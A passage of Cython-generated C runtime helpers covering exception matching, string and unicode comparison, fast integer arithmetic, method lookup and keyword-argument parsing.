static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches(PyObject *err, PyObject* exc_type) {
    if (likely(err == exc_type)) return 1;
    if (likely(PyExceptionClass_Check(err))) {
        if (likely(PyExceptionClass_Check(exc_type))) {
            return __Pyx_inner_PyErr_GivenExceptionMatches2(err, NULL, exc_type);
        } else if (likely(PyTuple_Check(exc_type))) {
            return __Pyx_PyErr_GivenExceptionMatchesTuple(err, exc_type);
        } else {
        }
    }
    return PyErr_GivenExceptionMatches(err, exc_type);
}
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches2(PyObject *err, PyObject *exc_type1, PyObject *exc_type2) {
    assert(PyExceptionClass_Check(exc_type1));
    assert(PyExceptionClass_Check(exc_type2));
    if (likely(err == exc_type1 || err == exc_type2)) return 1;
    if (likely(PyExceptionClass_Check(err))) {
        return __Pyx_inner_PyErr_GivenExceptionMatches2(err, exc_type1, exc_type2);
    }
    return (PyErr_GivenExceptionMatches(err, exc_type1) || PyErr_GivenExceptionMatches(err, exc_type2));
}
#endif


#if CYTHON_FAST_THREAD_STATE
static int __Pyx__GetException(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb)
#else
static int __Pyx_GetException(PyObject **type, PyObject **value, PyObject **tb)
#endif
{
    PyObject *local_type, *local_value, *local_tb;
#if CYTHON_FAST_THREAD_STATE
    PyObject *tmp_type, *tmp_value, *tmp_tb;
    local_type = tstate->curexc_type;
    local_value = tstate->curexc_value;
    local_tb = tstate->curexc_traceback;
    tstate->curexc_type = 0;
    tstate->curexc_value = 0;
    tstate->curexc_traceback = 0;
#else
    PyErr_Fetch(&local_type, &local_value, &local_tb);
#endif
    PyErr_NormalizeException(&local_type, &local_value, &local_tb);
#if CYTHON_FAST_THREAD_STATE
    if (unlikely(tstate->curexc_type))
#else
    if (unlikely(PyErr_Occurred()))
#endif
        goto bad;
    #if PY_MAJOR_VERSION >= 3
    if (local_tb) {
        if (unlikely(PyException_SetTraceback(local_value, local_tb) < 0))
            goto bad;
    }
    #endif
    Py_XINCREF(local_tb);
    Py_XINCREF(local_type);
    Py_XINCREF(local_value);
    *type = local_type;
    *value = local_value;
    *tb = local_tb;
#if CYTHON_FAST_THREAD_STATE
    #if CYTHON_USE_EXC_INFO_STACK
    {
        _PyErr_StackItem *exc_info = tstate->exc_info;
        tmp_type = exc_info->exc_type;
        tmp_value = exc_info->exc_value;
        tmp_tb = exc_info->exc_traceback;
        exc_info->exc_type = local_type;
        exc_info->exc_value = local_value;
        exc_info->exc_traceback = local_tb;
    }
    #else
    tmp_type = tstate->exc_type;
    tmp_value = tstate->exc_value;
    tmp_tb = tstate->exc_traceback;
    tstate->exc_type = local_type;
    tstate->exc_value = local_value;
    tstate->exc_traceback = local_tb;
    #endif
    Py_XDECREF(tmp_type);
    Py_XDECREF(tmp_value);
    Py_XDECREF(tmp_tb);
#else
    PyErr_SetExcInfo(local_type, local_value, local_tb);
#endif
    return 0;
bad:
    *type = 0;
    *value = 0;
    *tb = 0;
    Py_XDECREF(local_type);
    Py_XDECREF(local_value);
    Py_XDECREF(local_tb);
    return -1;
}


static CYTHON_INLINE void __Pyx_RaiseUnboundLocalError(const char *varname) {
    PyErr_Format(PyExc_UnboundLocalError, "local variable '%s' referenced before assignment", varname);
}


static CYTHON_INLINE int __Pyx_PyBytes_Equals(PyObject* s1, PyObject* s2, int equals) {
#if CYTHON_COMPILING_IN_PYPY
    return PyObject_RichCompareBool(s1, s2, equals);
#else
    if (s1 == s2) {
        return (equals == Py_EQ);
    } else if (PyBytes_CheckExact(s1) & PyBytes_CheckExact(s2)) {
        const char *ps1, *ps2;
        Py_ssize_t length = PyBytes_GET_SIZE(s1);
        if (length != PyBytes_GET_SIZE(s2))
            return (equals == Py_NE);
        ps1 = PyBytes_AS_STRING(s1);
        ps2 = PyBytes_AS_STRING(s2);
        if (ps1[0] != ps2[0]) {
            return (equals == Py_NE);
        } else if (length == 1) {
            return (equals == Py_EQ);
        } else {
            int result;
#if CYTHON_USE_UNICODE_INTERNALS
            Py_hash_t hash1, hash2;
            hash1 = ((PyBytesObject*)s1)->ob_shash;
            hash2 = ((PyBytesObject*)s2)->ob_shash;
            if (hash1 != hash2 && hash1 != -1 && hash2 != -1) {
                return (equals == Py_NE);
            }
#endif
            result = memcmp(ps1, ps2, (size_t)length);
            return (equals == Py_EQ) ? (result == 0) : (result != 0);
        }
    } else if ((s1 == Py_None) & PyBytes_CheckExact(s2)) {
        return (equals == Py_NE);
    } else if ((s2 == Py_None) & PyBytes_CheckExact(s1)) {
        return (equals == Py_NE);
    } else {
        int result;
        PyObject* py_result = PyObject_RichCompare(s1, s2, equals);
        if (!py_result)
            return -1;
        result = __Pyx_PyObject_IsTrue(py_result);
        Py_DECREF(py_result);
        return result;
    }
#endif
}


static CYTHON_INLINE int __Pyx_PyUnicode_Equals(PyObject* s1, PyObject* s2, int equals) {
#if CYTHON_COMPILING_IN_PYPY
    return PyObject_RichCompareBool(s1, s2, equals);
#else
#if PY_MAJOR_VERSION < 3
    PyObject* owned_ref = NULL;
#endif
    int s1_is_unicode, s2_is_unicode;
    if (s1 == s2) {
        goto return_eq;
    }
    s1_is_unicode = PyUnicode_CheckExact(s1);
    s2_is_unicode = PyUnicode_CheckExact(s2);
#if PY_MAJOR_VERSION < 3
    if ((s1_is_unicode & (!s2_is_unicode)) && PyString_CheckExact(s2)) {
        owned_ref = PyUnicode_FromObject(s2);
        if (unlikely(!owned_ref))
            return -1;
        s2 = owned_ref;
        s2_is_unicode = 1;
    } else if ((s2_is_unicode & (!s1_is_unicode)) && PyString_CheckExact(s1)) {
        owned_ref = PyUnicode_FromObject(s1);
        if (unlikely(!owned_ref))
            return -1;
        s1 = owned_ref;
        s1_is_unicode = 1;
    } else if (((!s2_is_unicode) & (!s1_is_unicode))) {
        return __Pyx_PyBytes_Equals(s1, s2, equals);
    }
#endif
    if (s1_is_unicode & s2_is_unicode) {
        Py_ssize_t length;
        int kind;
        void *data1, *data2;
        if (unlikely(__Pyx_PyUnicode_READY(s1) < 0) || unlikely(__Pyx_PyUnicode_READY(s2) < 0))
            return -1;
        length = __Pyx_PyUnicode_GET_LENGTH(s1);
        if (length != __Pyx_PyUnicode_GET_LENGTH(s2)) {
            goto return_ne;
        }
#if CYTHON_USE_UNICODE_INTERNALS
        {
            Py_hash_t hash1, hash2;
        #if CYTHON_PEP393_ENABLED
            hash1 = ((PyASCIIObject*)s1)->hash;
            hash2 = ((PyASCIIObject*)s2)->hash;
        #else
            hash1 = ((PyUnicodeObject*)s1)->hash;
            hash2 = ((PyUnicodeObject*)s2)->hash;
        #endif
            if (hash1 != hash2 && hash1 != -1 && hash2 != -1) {
                goto return_ne;
            }
        }
#endif
        kind = __Pyx_PyUnicode_KIND(s1);
        if (kind != __Pyx_PyUnicode_KIND(s2)) {
            goto return_ne;
        }
        data1 = __Pyx_PyUnicode_DATA(s1);
        data2 = __Pyx_PyUnicode_DATA(s2);
        if (__Pyx_PyUnicode_READ(kind, data1, 0) != __Pyx_PyUnicode_READ(kind, data2, 0)) {
            goto return_ne;
        } else if (length == 1) {
            goto return_eq;
        } else {
            int result = memcmp(data1, data2, (size_t)(length * kind));
            #if PY_MAJOR_VERSION < 3
            Py_XDECREF(owned_ref);
            #endif
            return (equals == Py_EQ) ? (result == 0) : (result != 0);
        }
    } else if ((s1 == Py_None) & s2_is_unicode) {
        goto return_ne;
    } else if ((s2 == Py_None) & s1_is_unicode) {
        goto return_ne;
    } else {
        int result;
        PyObject* py_result = PyObject_RichCompare(s1, s2, equals);
        #if PY_MAJOR_VERSION < 3
        Py_XDECREF(owned_ref);
        #endif
        if (!py_result)
            return -1;
        result = __Pyx_PyObject_IsTrue(py_result);
        Py_DECREF(py_result);
        return result;
    }
return_eq:
    #if PY_MAJOR_VERSION < 3
    Py_XDECREF(owned_ref);
    #endif
    return (equals == Py_EQ);
return_ne:
    #if PY_MAJOR_VERSION < 3
    Py_XDECREF(owned_ref);
    #endif
    return (equals == Py_NE);
#endif
}


#if CYTHON_FAST_THREAD_STATE
static int __Pyx_PyErr_ExceptionMatchesTuple(PyObject *exc_type, PyObject *tuple) {
    Py_ssize_t i, n;
    n = PyTuple_GET_SIZE(tuple);
#if PY_MAJOR_VERSION >= 3
    for (i=0; i<n; i++) {
        if (exc_type == PyTuple_GET_ITEM(tuple, i)) return 1;
    }
#endif
    for (i=0; i<n; i++) {
        if (__Pyx_PyErr_GivenExceptionMatches(exc_type, PyTuple_GET_ITEM(tuple, i))) return 1;
    }
    return 0;
}
static CYTHON_INLINE int __Pyx_PyErr_ExceptionMatchesInState(PyThreadState* tstate, PyObject* err) {
    PyObject *exc_type = tstate->curexc_type;
    if (exc_type == err) return 1;
    if (unlikely(!exc_type)) return 0;
    if (unlikely(PyTuple_Check(err)))
        return __Pyx_PyErr_ExceptionMatchesTuple(exc_type, err);
    return __Pyx_PyErr_GivenExceptionMatches(exc_type, err);
}
#endif


#if CYTHON_FAST_THREAD_STATE
static CYTHON_INLINE void __Pyx__ExceptionSwap(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb) {
    PyObject *tmp_type, *tmp_value, *tmp_tb;
    #if CYTHON_USE_EXC_INFO_STACK
    _PyErr_StackItem *exc_info = tstate->exc_info;
    tmp_type = exc_info->exc_type;
    tmp_value = exc_info->exc_value;
    tmp_tb = exc_info->exc_traceback;
    exc_info->exc_type = *type;
    exc_info->exc_value = *value;
    exc_info->exc_traceback = *tb;
    #else
    tmp_type = tstate->exc_type;
    tmp_value = tstate->exc_value;
    tmp_tb = tstate->exc_traceback;
    tstate->exc_type = *type;
    tstate->exc_value = *value;
    tstate->exc_traceback = *tb;
    #endif
    *type = tmp_type;
    *value = tmp_value;
    *tb = tmp_tb;
}
#else
static CYTHON_INLINE void __Pyx_ExceptionSwap(PyObject **type, PyObject **value, PyObject **tb) {
    PyObject *tmp_type, *tmp_value, *tmp_tb;
    PyErr_GetExcInfo(&tmp_type, &tmp_value, &tmp_tb);
    PyErr_SetExcInfo(*type, *value, *tb);
    *type = tmp_type;
    *value = tmp_value;
    *tb = tmp_tb;
}
#endif


#if !CYTHON_COMPILING_IN_PYPY
static PyObject* __Pyx_PyInt_AddObjC(PyObject *op1, PyObject *op2, CYTHON_UNUSED long intval, int inplace, int zerodivision_check) {
    (void)inplace;
    (void)zerodivision_check;
    #if PY_MAJOR_VERSION < 3
    if (likely(PyInt_CheckExact(op1))) {
        const long b = intval;
        long x;
        long a = PyInt_AS_LONG(op1);
            x = (long)((unsigned long)a + b);
            if (likely((x^a) >= 0 || (x^b) >= 0))
                return PyInt_FromLong(x);
            return PyLong_Type.tp_as_number->nb_add(op1, op2);
    }
    #endif
    #if CYTHON_USE_PYLONG_INTERNALS
    if (likely(PyLong_CheckExact(op1))) {
        const long b = intval;
        long a, x;
#ifdef HAVE_LONG_LONG
        const PY_LONG_LONG llb = intval;
        PY_LONG_LONG lla, llx;
#endif
        const digit* digits = ((PyLongObject*)op1)->ob_digit;
        const Py_ssize_t size = Py_SIZE(op1);
        if (likely(__Pyx_sst_abs(size) <= 1)) {
            a = likely(size) ? digits[0] : 0;
            if (size == -1) a = -a;
        } else {
            switch (size) {
                case -2:
                    if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                        a = -(long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0]));
                        break;
#ifdef HAVE_LONG_LONG
                    } else if (8 * sizeof(PY_LONG_LONG) - 1 > 2 * PyLong_SHIFT) {
                        lla = -(PY_LONG_LONG) (((((unsigned PY_LONG_LONG)digits[1]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[0]));
                        goto long_long;
#endif
                    }
                    CYTHON_FALLTHROUGH;
                case 2:
                    if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                        a = (long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0]));
                        break;
#ifdef HAVE_LONG_LONG
                    } else if (8 * sizeof(PY_LONG_LONG) - 1 > 2 * PyLong_SHIFT) {
                        lla = (PY_LONG_LONG) (((((unsigned PY_LONG_LONG)digits[1]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[0]));
                        goto long_long;
#endif
                    }
                    CYTHON_FALLTHROUGH;
                case -3:
                    if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                        a = -(long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0]));
                        break;
#ifdef HAVE_LONG_LONG
                    } else if (8 * sizeof(PY_LONG_LONG) - 1 > 3 * PyLong_SHIFT) {
                        lla = -(PY_LONG_LONG) (((((((unsigned PY_LONG_LONG)digits[2]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[1]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[0]));
                        goto long_long;
#endif
                    }
                    CYTHON_FALLTHROUGH;
                case 3:
                    if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                        a = (long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0]));
                        break;
#ifdef HAVE_LONG_LONG
                    } else if (8 * sizeof(PY_LONG_LONG) - 1 > 3 * PyLong_SHIFT) {
                        lla = (PY_LONG_LONG) (((((((unsigned PY_LONG_LONG)digits[2]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[1]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[0]));
                        goto long_long;
#endif
                    }
                    CYTHON_FALLTHROUGH;
                case -4:
                    if (8 * sizeof(long) - 1 > 4 * PyLong_SHIFT) {
                        a = -(long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0]));
                        break;
#ifdef HAVE_LONG_LONG
                    } else if (8 * sizeof(PY_LONG_LONG) - 1 > 4 * PyLong_SHIFT) {
                        lla = -(PY_LONG_LONG) (((((((((unsigned PY_LONG_LONG)digits[3]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[2]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[1]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[0]));
                        goto long_long;
#endif
                    }
                    CYTHON_FALLTHROUGH;
                case 4:
                    if (8 * sizeof(long) - 1 > 4 * PyLong_SHIFT) {
                        a = (long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0]));
                        break;
#ifdef HAVE_LONG_LONG
                    } else if (8 * sizeof(PY_LONG_LONG) - 1 > 4 * PyLong_SHIFT) {
                        lla = (PY_LONG_LONG) (((((((((unsigned PY_LONG_LONG)digits[3]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[2]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[1]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[0]));
                        goto long_long;
#endif
                    }
                    CYTHON_FALLTHROUGH;
                default: return PyLong_Type.tp_as_number->nb_add(op1, op2);
            }
        }
                x = a + b;
            return PyLong_FromLong(x);
#ifdef HAVE_LONG_LONG
        long_long:
                llx = lla + llb;
            return PyLong_FromLongLong(llx);
#endif
        
        
    }
    #endif
    if (PyFloat_CheckExact(op1)) {
        const long b = intval;
        double a = PyFloat_AS_DOUBLE(op1);
            double result;
            PyFPE_START_PROTECT("add", return NULL)
            result = ((double)a) + (double)b;
            PyFPE_END_PROTECT(result)
            return PyFloat_FromDouble(result);
    }
    return (inplace ? PyNumber_InPlaceAdd : PyNumber_Add)(op1, op2);
}
#endif


static int __Pyx_PyObject_GetMethod(PyObject *obj, PyObject *name, PyObject **method) {
    PyObject *attr;
#if CYTHON_UNPACK_METHODS && CYTHON_COMPILING_IN_CPYTHON && CYTHON_USE_PYTYPE_LOOKUP
    PyTypeObject *tp = Py_TYPE(obj);
    PyObject *descr;
    descrgetfunc f = NULL;
    PyObject **dictptr, *dict;
    int meth_found = 0;
    assert (*method == NULL);
    if (unlikely(tp->tp_getattro != PyObject_GenericGetAttr)) {
        attr = __Pyx_PyObject_GetAttrStr(obj, name);
        goto try_unpack;
    }
    if (unlikely(tp->tp_dict == NULL) && unlikely(PyType_Ready(tp) < 0)) {
        return 0;
    }
    descr = _PyType_Lookup(tp, name);
    if (likely(descr != NULL)) {
        Py_INCREF(descr);
#if PY_MAJOR_VERSION >= 3
        #ifdef __Pyx_CyFunction_USED
        if (likely(PyFunction_Check(descr) || (Py_TYPE(descr) == &PyMethodDescr_Type) || __Pyx_CyFunction_Check(descr)))
        #else
        if (likely(PyFunction_Check(descr) || (Py_TYPE(descr) == &PyMethodDescr_Type)))
        #endif
#else
        #ifdef __Pyx_CyFunction_USED
        if (likely(PyFunction_Check(descr) || __Pyx_CyFunction_Check(descr)))
        #else
        if (likely(PyFunction_Check(descr)))
        #endif
#endif
        {
            meth_found = 1;
        } else {
            f = Py_TYPE(descr)->tp_descr_get;
            if (f != NULL && PyDescr_IsData(descr)) {
                attr = f(descr, obj, (PyObject *)Py_TYPE(obj));
                Py_DECREF(descr);
                goto try_unpack;
            }
        }
    }
    dictptr = _PyObject_GetDictPtr(obj);
    if (dictptr != NULL && (dict = *dictptr) != NULL) {
        Py_INCREF(dict);
        attr = __Pyx_PyDict_GetItemStr(dict, name);
        if (attr != NULL) {
            Py_INCREF(attr);
            Py_DECREF(dict);
            Py_XDECREF(descr);
            goto try_unpack;
        }
        Py_DECREF(dict);
    }
    if (meth_found) {
        *method = descr;
        return 1;
    }
    if (f != NULL) {
        attr = f(descr, obj, (PyObject *)Py_TYPE(obj));
        Py_DECREF(descr);
        goto try_unpack;
    }
    if (descr != NULL) {
        *method = descr;
        return 0;
    }
    PyErr_Format(PyExc_AttributeError,
#if PY_MAJOR_VERSION >= 3
                 "'%.50s' object has no attribute '%U'",
                 tp->tp_name, name);
#else
                 "'%.50s' object has no attribute '%.400s'",
                 tp->tp_name, PyString_AS_STRING(name));
#endif
    return 0;
#else
    attr = __Pyx_PyObject_GetAttrStr(obj, name);
    goto try_unpack;
#endif
try_unpack:
#if CYTHON_UNPACK_METHODS
    if (likely(attr) && PyMethod_Check(attr) && likely(PyMethod_GET_SELF(attr) == obj)) {
        PyObject *function = PyMethod_GET_FUNCTION(attr);
        Py_INCREF(function);
        Py_DECREF(attr);
        *method = function;
        return 1;
    }
#endif
    *method = attr;
    return 0;
}


static PyObject* __Pyx__PyObject_CallMethod1(PyObject* method, PyObject* arg) {
    PyObject *result = __Pyx_PyObject_CallOneArg(method, arg);
    Py_DECREF(method);
    return result;
}
static PyObject* __Pyx_PyObject_CallMethod1(PyObject* obj, PyObject* method_name, PyObject* arg) {
    PyObject *method = NULL, *result;
    int is_method = __Pyx_PyObject_GetMethod(obj, method_name, &method);
    if (likely(is_method)) {
        result = __Pyx_PyObject_Call2Args(method, obj, arg);
        Py_DECREF(method);
        return result;
    }
    if (unlikely(!method)) return NULL;
    return __Pyx__PyObject_CallMethod1(method, arg);
}


static CYTHON_INLINE int __Pyx_PyObject_Append(PyObject* L, PyObject* x) {
    if (likely(PyList_CheckExact(L))) {
        if (unlikely(__Pyx_PyList_Append(L, x) < 0)) return -1;
    } else {
        PyObject* retval = __Pyx_PyObject_CallMethod1(L, __pyx_n_s_append, x);
        if (unlikely(!retval))
            return -1;
        Py_DECREF(retval);
    }
    return 0;
}


#if !CYTHON_COMPILING_IN_PYPY
static PyObject* __Pyx_PyInt_SubtractObjC(PyObject *op1, PyObject *op2, CYTHON_UNUSED long intval, int inplace, int zerodivision_check) {
    (void)inplace;
    (void)zerodivision_check;
    #if PY_MAJOR_VERSION < 3
    if (likely(PyInt_CheckExact(op1))) {
        const long b = intval;
        long x;
        long a = PyInt_AS_LONG(op1);
            x = (long)((unsigned long)a - b);
            if (likely((x^a) >= 0 || (x^~b) >= 0))
                return PyInt_FromLong(x);
            return PyLong_Type.tp_as_number->nb_subtract(op1, op2);
    }
    #endif
    #if CYTHON_USE_PYLONG_INTERNALS
    if (likely(PyLong_CheckExact(op1))) {
        const long b = intval;
        long a, x;
#ifdef HAVE_LONG_LONG
        const PY_LONG_LONG llb = intval;
        PY_LONG_LONG lla, llx;
#endif
        const digit* digits = ((PyLongObject*)op1)->ob_digit;
        const Py_ssize_t size = Py_SIZE(op1);
        if (likely(__Pyx_sst_abs(size) <= 1)) {
            a = likely(size) ? digits[0] : 0;
            if (size == -1) a = -a;
        } else {
            switch (size) {
                case -2:
                    if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                        a = -(long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0]));
                        break;
#ifdef HAVE_LONG_LONG
                    } else if (8 * sizeof(PY_LONG_LONG) - 1 > 2 * PyLong_SHIFT) {
                        lla = -(PY_LONG_LONG) (((((unsigned PY_LONG_LONG)digits[1]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[0]));
                        goto long_long;
#endif
                    }
                    CYTHON_FALLTHROUGH;
                case 2:
                    if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                        a = (long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0]));
                        break;
#ifdef HAVE_LONG_LONG
                    } else if (8 * sizeof(PY_LONG_LONG) - 1 > 2 * PyLong_SHIFT) {
                        lla = (PY_LONG_LONG) (((((unsigned PY_LONG_LONG)digits[1]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[0]));
                        goto long_long;
#endif
                    }
                    CYTHON_FALLTHROUGH;
                case -3:
                    if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                        a = -(long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0]));
                        break;
#ifdef HAVE_LONG_LONG
                    } else if (8 * sizeof(PY_LONG_LONG) - 1 > 3 * PyLong_SHIFT) {
                        lla = -(PY_LONG_LONG) (((((((unsigned PY_LONG_LONG)digits[2]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[1]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[0]));
                        goto long_long;
#endif
                    }
                    CYTHON_FALLTHROUGH;
                case 3:
                    if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                        a = (long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0]));
                        break;
#ifdef HAVE_LONG_LONG
                    } else if (8 * sizeof(PY_LONG_LONG) - 1 > 3 * PyLong_SHIFT) {
                        lla = (PY_LONG_LONG) (((((((unsigned PY_LONG_LONG)digits[2]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[1]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[0]));
                        goto long_long;
#endif
                    }
                    CYTHON_FALLTHROUGH;
                case -4:
                    if (8 * sizeof(long) - 1 > 4 * PyLong_SHIFT) {
                        a = -(long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0]));
                        break;
#ifdef HAVE_LONG_LONG
                    } else if (8 * sizeof(PY_LONG_LONG) - 1 > 4 * PyLong_SHIFT) {
                        lla = -(PY_LONG_LONG) (((((((((unsigned PY_LONG_LONG)digits[3]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[2]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[1]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[0]));
                        goto long_long;
#endif
                    }
                    CYTHON_FALLTHROUGH;
                case 4:
                    if (8 * sizeof(long) - 1 > 4 * PyLong_SHIFT) {
                        a = (long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0]));
                        break;
#ifdef HAVE_LONG_LONG
                    } else if (8 * sizeof(PY_LONG_LONG) - 1 > 4 * PyLong_SHIFT) {
                        lla = (PY_LONG_LONG) (((((((((unsigned PY_LONG_LONG)digits[3]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[2]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[1]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[0]));
                        goto long_long;
#endif
                    }
                    CYTHON_FALLTHROUGH;
                default: return PyLong_Type.tp_as_number->nb_subtract(op1, op2);
            }
        }
                x = a - b;
            return PyLong_FromLong(x);
#ifdef HAVE_LONG_LONG
        long_long:
                llx = lla - llb;
            return PyLong_FromLongLong(llx);
#endif
        
        
    }
    #endif
    if (PyFloat_CheckExact(op1)) {
        const long b = intval;
        double a = PyFloat_AS_DOUBLE(op1);
            double result;
            PyFPE_START_PROTECT("subtract", return NULL)
            result = ((double)a) - (double)b;
            PyFPE_END_PROTECT(result)
            return PyFloat_FromDouble(result);
    }
    return (inplace ? PyNumber_InPlaceSubtract : PyNumber_Subtract)(op1, op2);
}
#endif


static void __Pyx_RaiseArgtupleInvalid(
    const char* func_name,
    int exact,
    Py_ssize_t num_min,
    Py_ssize_t num_max,
    Py_ssize_t num_found)
{
    Py_ssize_t num_expected;
    const char *more_or_less;
    if (num_found < num_min) {
        num_expected = num_min;
        more_or_less = "at least";
    } else {
        num_expected = num_max;
        more_or_less = "at most";
    }
    if (exact) {
        more_or_less = "exactly";
    }
    PyErr_Format(PyExc_TypeError,
                 "%.200s() takes %.8s %" CYTHON_FORMAT_SSIZE_T "d positional argument%.1s (%" CYTHON_FORMAT_SSIZE_T "d given)",
                 func_name, more_or_less, num_expected,
                 (num_expected == 1) ? "" : "s", num_found);
}


static void __Pyx_RaiseDoubleKeywordsError(
    const char* func_name,
    PyObject* kw_name)
{
    PyErr_Format(PyExc_TypeError,
        #if PY_MAJOR_VERSION >= 3
        "%s() got multiple values for keyword argument '%U'", func_name, kw_name);
        #else
        "%s() got multiple values for keyword argument '%s'", func_name,
        PyString_AsString(kw_name));
        #endif
}


static int __Pyx_ParseOptionalKeywords(
    PyObject *kwds,
    PyObject **argnames[],
    PyObject *kwds2,
    PyObject *values[],
    Py_ssize_t num_pos_args,
    const char* function_name)
{
    PyObject *key = 0, *value = 0;
    Py_ssize_t pos = 0;
    PyObject*** name;
    PyObject*** first_kw_arg = argnames + num_pos_args;
    while (PyDict_Next(kwds, &pos, &key, &value)) {
        name = first_kw_arg;
        while (*name && (**name != key)) name++;
        if (*name) {
            values[name-argnames] = value;
            continue;
        }
        name = first_kw_arg;
        #if PY_MAJOR_VERSION < 3
        if (likely(PyString_Check(key))) {
            while (*name) {
                if ((CYTHON_COMPILING_IN_PYPY || PyString_GET_SIZE(**name) == PyString_GET_SIZE(key))
                        && _PyString_Eq(**name, key)) {
                    values[name-argnames] = value;
                    break;
                }
                name++;
            }
            if (*name) continue;
            else {
                PyObject*** argname = argnames;
                while (argname != first_kw_arg) {
                    if ((**argname == key) || (
                            (CYTHON_COMPILING_IN_PYPY || PyString_GET_SIZE(**argname) == PyString_GET_SIZE(key))
                             && _PyString_Eq(**argname, key))) {
                        goto arg_passed_twice;
                    }
                    argname++;
                }
            }
        } else
        #endif
        if (likely(PyUnicode_Check(key))) {
            while (*name) {
                int cmp = (**name == key) ? 0 :
                #if !CYTHON_COMPILING_IN_PYPY && PY_MAJOR_VERSION >= 3
                    (__Pyx_PyUnicode_GET_LENGTH(**name) != __Pyx_PyUnicode_GET_LENGTH(key)) ? 1 :
                #endif
                    PyUnicode_Compare(**name, key);
                if (cmp < 0 && unlikely(PyErr_Occurred())) goto bad;
                if (cmp == 0) {
                    values[name-argnames] = value;
                    break;
                }
                name++;
            }
            if (*name) continue;
            else {
                PyObject*** argname = argnames;
                while (argname != first_kw_arg) {
                    int cmp = (**argname == key) ? 0 :
                    #if !CYTHON_COMPILING_IN_PYPY && PY_MAJOR_VERSION >= 3
                        (__Pyx_PyUnicode_GET_LENGTH(**argname) != __Pyx_PyUnicode_GET_LENGTH(key)) ? 1 :
                    #endif
                        PyUnicode_Compare(**argname, key);
                    if (cmp < 0 && unlikely(PyErr_Occurred())) goto bad;
                    if (cmp == 0) goto arg_passed_twice;
                    argname++;
                }
            }
        } else
            goto invalid_keyword_type;
        if (kwds2) {
            if (unlikely(PyDict_SetItem(kwds2, key, value))) goto bad;
        } else {
            goto invalid_keyword;
        }
    }
    return 0;
arg_passed_twice:
    __Pyx_RaiseDoubleKeywordsError(function_name, key);
    goto bad;
invalid_keyword_type:
    PyErr_Format(PyExc_TypeError,
        "%.200s() keywords must be strings", function_name);
    goto bad;
invalid_keyword:
    PyErr_Format(PyExc_TypeError,
    #if PY_MAJOR_VERSION < 3
        "%.200s() got an unexpected keyword argument '%.200s'",
        function_name, PyString_AsString(key));
    #else
        "%s() got an unexpected keyword argument '%U'",
        function_name, key);
    #endif
bad:
    return -1;
}


static CYTHON_INLINE PyObject* __Pyx_PyObject_FormatSimpleAndDecref(PyObject* s, PyObject* f) {
    if (unlikely(!s)) return NULL;
    if (likely(PyUnicode_CheckExact(s))) return s;
    #if PY_MAJOR_VERSION < 3
    if (likely(PyString_CheckExact(s))) {
        PyObject *result = PyUnicode_FromEncodedObject(s, NULL, "strict");
        Py_DECREF(s);
        return result;
    }
    #endif
    return __Pyx_PyObject_FormatAndDecref(s, f);
}
